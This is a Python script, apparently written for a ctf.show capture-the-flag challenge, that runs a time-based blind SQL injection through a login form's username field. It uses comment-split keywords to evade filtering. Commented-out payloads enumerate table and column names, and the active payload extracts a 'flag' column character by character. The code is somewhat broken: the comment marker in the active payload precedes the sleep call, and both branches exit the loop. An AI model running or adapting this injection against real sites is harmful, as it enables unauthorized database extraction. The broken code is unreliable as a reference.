import requests
s = requests.session()
url = 'http://2a9b98d7-d7ff-4b78-9b30-626781a29bde.challenge.ctf.show:8080/'
table = ""


for i in range(1, 45):
    print(i)
    for j in range(31, 128):
        # 爆表名  flag
        #payload = "if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s,sleep(0.5),0)#"%(str(i),str(j))
        # 爆字段名 flag
        #payload = "if(ascii(substr((sele/**/ct/**/group_concat(column_name)/**/fr/**/om/**/information_schema.columns/**/whe/**/re/**/table_name='user')fr/**/om/**/%s/**/for/**/1))=%s,sle/**/ep(0.5),0)#"%(str(i),str(j))
        # 读取flag
        payload = "if(ascii(substr((select/**/flag/**/from/**/user)from/**/%s/**/for/**/1))=%s#,sleep(0.5),0)" % (str(i), str(j))

        data = {
            "username": payload,
            "password":1111
        }

        try:
            ra = s.post(url=url,data=data, timeout=0.5).text
            table += chr(j)
            print(table)
            break
        except:
            break
